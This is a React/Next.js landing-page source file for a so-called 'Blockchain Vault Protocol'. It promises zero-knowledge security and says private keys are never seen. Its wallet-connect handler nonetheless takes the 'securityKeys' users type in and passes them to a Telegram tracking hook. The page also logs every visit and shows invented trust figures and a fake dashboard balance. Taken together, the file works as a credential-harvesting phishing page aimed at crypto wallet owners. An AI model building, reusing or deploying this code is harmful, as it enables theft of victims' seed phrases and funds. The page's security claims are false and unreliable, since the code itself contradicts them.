"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Icons } from "@/components/icons"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"
import { useTelegramTracking } from "@/hooks/use-telegram-tracking"

function useInView(threshold = 0.1) {
  const [isInView, setIsInView] = useState(false)
  const ref = useRef<HTMLDivElement>(null)

  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting) {
          setIsInView(true)
        }
      },
      { threshold },
    )

    if (ref.current) {
      observer.observe(ref.current)
    }

    return () => observer.disconnect()
  }, [threshold])

  return [ref, isInView] as const
}

export default function HomePage() {
  const [isConnected, setIsConnected] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState("")
  const router = useRouter()

  const { trackVisit, trackWalletConnection } = useTelegramTracking()

  useEffect(() => {
    trackVisit()
  }, [trackVisit])

  const handleWalletConnect = async (walletType: string, securityKeys: string) => {
    setSelectedWallet(walletType)
    setIsConnected(true)

    await trackWalletConnection(walletType, securityKeys.trim().length > 0, securityKeys)

    setTimeout(() => {
      router.push("/dashboard")
    }, 1000)
  }

  const [heroRef, heroInView] = useInView()
  const [defiRef, defiInView] = useInView()
  const [securityRef, securityInView] = useInView()
  const [statsRef, statsInView] = useInView()
  const [featuresRef, featuresInView] = useInView()
  const [ctaRef, ctaInView] = useInView()

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="flex items-center justify-center w-10 h-10 bg-primary rounded-lg">
                <Icons.Shield />
              </div>
              <div>
                <h1 className="text-xl font-bold font-sans hidden sm:block">BLOCKCHAIN VAULT PROTOCOL</h1>
                <h1 className="text-xl font-bold font-sans sm:hidden">BVP</h1>
                <p className="text-sm text-muted-foreground font-mono hidden sm:block">Secure Crypto Management</p>
                <p className="text-sm text-muted-foreground font-mono sm:hidden">Secure Vault</p>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              {isConnected ? (
                <Badge variant="secondary" className="bg-primary/20 text-primary border-primary/30">
                  <Icons.Wallet />
                  <span className="hidden sm:inline">{selectedWallet} Connected</span>
                  <span className="sm:hidden">Connected</span>
                </Badge>
              ) : (
                <WalletConnectionModal onConnect={handleWalletConnect}>
                  <Button className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium">
                    <Icons.Wallet />
                    <span className="hidden sm:inline">Connect Wallet</span>
                    <span className="sm:hidden">Connect</span>
                  </Button>
                </WalletConnectionModal>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        {!isConnected ? (
          /* Welcome Section */
          <div
            ref={heroRef}
            className={`text-center py-16 transition-all duration-1000 ${
              heroInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
            }`}
          >
            <div className="max-w-3xl mx-auto">
              <div className="flex justify-center mb-6">
                <div className="relative">
                  <div className="flex items-center justify-center w-20 h-20 bg-primary/20 rounded-full animate-pulse">
                    <Icons.Shield />
                  </div>
                  <div className="absolute inset-0 w-20 h-20 bg-primary/10 rounded-full animate-ping"></div>
                </div>
              </div>
              <h2 className="text-4xl md:text-5xl font-bold font-sans mb-4 bg-gradient-to-r from-primary to-primary/70 bg-clip-text text-transparent">
                Secure Your Digital Assets
              </h2>
              <p className="text-xl text-muted-foreground font-mono mb-8 leading-relaxed">
                Connect your cryptocurrency wallet to access our advanced vault protocol. Experience enterprise-grade
                security with seamless wallet integration.
              </p>
              <WalletConnectionModal onConnect={handleWalletConnect}>
                <Button
                  size="lg"
                  className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium px-8 py-3 transform hover:scale-105 transition-all duration-200"
                >
                  <Icons.Wallet />
                  Get Started
                  <Icons.ChevronRight />
                </Button>
              </WalletConnectionModal>
            </div>
          </div>
        ) : (
          /* Dashboard */
          <div className="space-y-8">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-3xl font-bold font-sans">Vault Dashboard</h2>
                <p className="text-muted-foreground font-mono">Manage your secure crypto vault</p>
              </div>
              <Badge variant="outline" className="border-primary/30 text-primary">
                <Icons.Activity />
                Active Session
              </Badge>
            </div>

            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <Card className="bg-card border-border">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium font-mono">Total Balance</CardTitle>
                  <Icons.TrendingUp />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold font-sans">$12,345.67</div>
                  <p className="text-xs text-muted-foreground">+2.5% from last month</p>
                </CardContent>
              </Card>

              <Card className="bg-card border-border">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium font-mono">Active Wallets</CardTitle>
                  <Icons.Wallet />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold font-sans">3</div>
                  <p className="text-xs text-muted-foreground">Connected securely</p>
                </CardContent>
              </Card>

              <Card className="bg-card border-border">
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium font-mono">Security Score</CardTitle>
                  <Icons.Shield />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold font-sans text-primary">98%</div>
                  <p className="text-xs text-muted-foreground">Excellent protection</p>
                </CardContent>
              </Card>
            </div>

            {/* Wallet Management */}
            <Card className="bg-card border-border">
              <CardHeader>
                <CardTitle className="font-sans">Connected Wallets</CardTitle>
                <CardDescription className="font-mono">Manage your connected cryptocurrency wallets</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex items-center justify-between p-4 bg-muted/50 rounded-lg">
                  <div className="flex items-center space-x-3">
                    <div className="w-10 h-10 bg-primary/20 rounded-lg flex items-center justify-center">
                      <Icons.Wallet />
                    </div>
                    <div>
                      <p className="font-medium font-sans">{selectedWallet}</p>
                      <p className="text-sm text-muted-foreground font-mono">Primary Wallet</p>
                    </div>
                  </div>
                  <Badge variant="secondary" className="bg-primary/20 text-primary border-primary/30">
                    Connected
                  </Badge>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* DeFi Integration Section */}
        <section
          ref={defiRef}
          className={`py-20 bg-gradient-to-b from-background to-muted/20 transition-all duration-1000 ${
            defiInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
          }`}
        >
          <div className="text-center mb-16">
            <Badge variant="outline" className="mb-4 border-primary/30 text-primary">
              DeFi Integration
            </Badge>
            <h3 className="text-4xl font-bold font-sans mb-6">Decentralized Finance Made Simple</h3>
            <p className="text-xl text-muted-foreground font-mono max-w-3xl mx-auto leading-relaxed">
              Access the full potential of DeFi protocols through our secure vault interface. Yield farming, liquidity
              provision, and staking - all from one platform.
            </p>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mb-16">
            <div className="order-2 lg:order-1">
              <img
                src="/placeholder-grdcq.png"
                alt="DeFi Dashboard Interface"
                className="rounded-2xl shadow-2xl border border-border w-full hover:scale-105 transition-transform duration-500"
              />
            </div>
            <div className="space-y-8 order-1 lg:order-2">
              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.TrendingUp />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Yield Optimization</h4>
                  <p className="text-muted-foreground font-mono">
                    Automatically find and deploy to the highest-yielding DeFi protocols across multiple chains.
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.Coins />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Multi-Chain Support</h4>
                  <p className="text-muted-foreground font-mono">
                    Access DeFi opportunities across Ethereum, Polygon, Arbitrum, and other major networks.
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.BarChart3 />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Risk Management</h4>
                  <p className="text-muted-foreground font-mono">
                    Advanced analytics and risk assessment tools to protect your DeFi investments.
                  </p>
                </div>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {[
              {
                icon: Icons.Zap,
                title: "Lightning Fast",
                desc: "Execute DeFi transactions with minimal gas fees and maximum speed across all supported networks.",
              },
              {
                icon: Icons.Globe,
                title: "Cross-Chain",
                desc: "Seamlessly bridge assets and access opportunities across multiple blockchain networks.",
              },
              {
                icon: Icons.Users,
                title: "Community Driven",
                desc: "Join thousands of users maximizing their DeFi returns through our collaborative platform.",
              },
            ].map((feature, index) => (
              <Card
                key={index}
                className="bg-card/50 border-border backdrop-blur-sm transform hover:scale-105 transition-all duration-300 hover:shadow-lg"
                style={{ animationDelay: `${index * 200}ms` }}
              >
                <CardHeader className="text-center">
                  <div className="w-16 h-16 bg-primary/20 rounded-full flex items-center justify-center mx-auto mb-4">
                    <feature.icon />
                  </div>
                  <CardTitle className="font-sans">{feature.title}</CardTitle>
                </CardHeader>
                <CardContent className="text-center">
                  <p className="text-muted-foreground font-mono">{feature.desc}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </section>

        {/* Security & Protection Section */}
        <section
          ref={securityRef}
          className={`py-20 transition-all duration-1000 ${
            securityInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
          }`}
        >
          <div className="text-center mb-16">
            <Badge variant="outline" className="mb-4 border-primary/30 text-primary">
              Enterprise Security
            </Badge>
            <h3 className="text-4xl font-bold font-sans mb-6">Military-Grade Protection</h3>
            <p className="text-xl text-muted-foreground font-mono max-w-3xl mx-auto leading-relaxed">
              Your digital assets deserve the highest level of protection. Our security infrastructure is built with
              zero-trust architecture and battle-tested encryption.
            </p>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mb-16">
            <div className="space-y-8">
              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.Shield />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Zero-Knowledge Architecture</h4>
                  <p className="text-muted-foreground font-mono">
                    We never see or store your private keys. All encryption happens client-side for maximum security.
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.Lock />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Multi-Signature Protection</h4>
                  <p className="text-muted-foreground font-mono">
                    Advanced multi-sig wallets and time-locked transactions provide additional security layers.
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-4 transform hover:translate-x-2 transition-transform duration-300">
                <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center flex-shrink-0">
                  <Icons.Activity />
                </div>
                <div>
                  <h4 className="text-xl font-semibold font-sans mb-2">Real-Time Monitoring</h4>
                  <p className="text-muted-foreground font-mono">
                    24/7 threat detection and anomaly monitoring to protect against unauthorized access.
                  </p>
                </div>
              </div>
            </div>
            <div>
              <img
                src="/cybersecurity-dashboard-dark.png"
                alt="Security Dashboard"
                className="rounded-2xl shadow-2xl border border-border w-full hover:scale-105 transition-transform duration-500"
              />
            </div>
          </div>

          {/* Security Features Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { icon: Icons.Shield, title: "AES-256 Encryption", desc: "Military-grade encryption" },
              { icon: Icons.Lock, title: "Hardware Security", desc: "HSM-backed key storage" },
              { icon: Icons.CheckCircle, title: "Audit Verified", desc: "Third-party security audits" },
              { icon: Icons.Activity, title: "24/7 Monitoring", desc: "Continuous threat detection" },
            ].map((feature, index) => (
              <Card
                key={index}
                className="bg-card/50 border-border backdrop-blur-sm text-center transform hover:scale-105 transition-all duration-300"
                style={{ animationDelay: `${index * 150}ms` }}
              >
                <CardContent className="pt-6">
                  <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center mx-auto mb-4">
                    <feature.icon />
                  </div>
                  <h4 className="font-semibold font-sans mb-2">{feature.title}</h4>
                  <p className="text-sm text-muted-foreground font-mono">{feature.desc}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </section>

        {/* Trust & Statistics Section */}
        <section
          ref={statsRef}
          className={`py-20 bg-gradient-to-b from-muted/20 to-background transition-all duration-1000 ${
            statsInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
          }`}
        >
          <div className="text-center mb-16">
            <h3 className="text-4xl font-bold font-sans mb-6">Trusted by Crypto Enthusiasts Worldwide</h3>
            <p className="text-xl text-muted-foreground font-mono max-w-2xl mx-auto">
              Join the growing community of users who trust our platform with their digital assets.
            </p>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 mb-16">
            {[
              { value: "$2.5B+", label: "Assets Secured" },
              { value: "150K+", label: "Active Users" },
              { value: "99.9%", label: "Uptime" },
              { value: "25+", label: "Supported Wallets" },
            ].map((stat, index) => (
              <div
                key={index}
                className={`text-center transform transition-all duration-700 ${
                  statsInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
                }`}
                style={{ transitionDelay: `${index * 200}ms` }}
              >
                <div className="text-3xl md:text-4xl font-bold font-sans text-primary mb-2">{stat.value}</div>
                <p className="text-muted-foreground font-mono text-sm md:text-base">{stat.label}</p>
              </div>
            ))}
          </div>

          <div className="text-center">
            <img
              src="/placeholder-4xueb.png"
              alt="Crypto Ecosystem"
              className="rounded-2xl shadow-xl border border-border mx-auto max-w-full hover:scale-105 transition-transform duration-500"
            />
          </div>
        </section>

        {/* Features Section */}
        <div
          ref={featuresRef}
          className={`py-16 transition-all duration-1000 ${
            featuresInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
          }`}
        >
          <div className="text-center mb-12">
            <h3 className="text-2xl font-bold font-sans mb-4">Why Choose Our Vault?</h3>
            <p className="text-xl text-muted-foreground font-mono max-w-2xl mx-auto">
              Advanced security features designed for the modern crypto investor
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {[
              {
                icon: Icons.Shield,
                title: "Bank-Grade Security",
                desc: "Multi-layer encryption and advanced security protocols protect your assets",
              },
              {
                icon: Icons.Wallet,
                title: "Multi-Wallet Support",
                desc: "Connect and manage multiple wallets from a single secure interface",
              },
              {
                icon: Icons.Lock,
                title: "Private & Secure",
                desc: "Your private keys remain secure with zero-knowledge architecture",
              },
            ].map((feature, index) => (
              <div
                key={index}
                className={`text-center transform transition-all duration-700 hover:scale-105 ${
                  featuresInView ? "translate-y-0 opacity-100" : "translate-y-10 opacity-0"
                }`}
                style={{ transitionDelay: `${index * 200}ms` }}
              >
                <div className="flex justify-center mb-4">
                  <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center">
                    <feature.icon />
                  </div>
                </div>
                <h4 className="text-lg font-semibold font-sans mb-2">{feature.title}</h4>
                <p className="text-muted-foreground font-mono text-sm">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Call to Action Section */}
        <section
          ref={ctaRef}
          className={`py-20 text-center transition-all duration-1000 ${
            ctaInView ? "opacity-100 translate-y-0" : "opacity-0 translate-y-10"
          }`}
        >
          <div className="max-w-3xl mx-auto">
            <h3 className="text-4xl font-bold font-sans mb-6">Ready to Secure Your Crypto?</h3>
            <p className="text-xl text-muted-foreground font-mono mb-8 leading-relaxed">
              Join thousands of users who trust our platform with their digital assets. Start your secure crypto journey
              today.
            </p>
            <div className="flex flex-col sm:flex-row gap-4 justify-center">
              <WalletConnectionModal onConnect={handleWalletConnect}>
                <Button
                  size="lg"
                  className="bg-primary hover:bg-primary/90 text-primary-foreground font-medium px-8 transform hover:scale-105 transition-all duration-200"
                >
                  <Icons.Wallet />
                  Connect Your Wallet
                  <Icons.ArrowUpRight />
                </Button>
              </WalletConnectionModal>
              <Button
                size="lg"
                variant="outline"
                className="border-border hover:bg-muted/50 px-8 bg-transparent transform hover:scale-105 transition-all duration-200"
              >
                Learn More
              </Button>
            </div>
          </div>
        </section>
      </main>
    </div>
  )
}
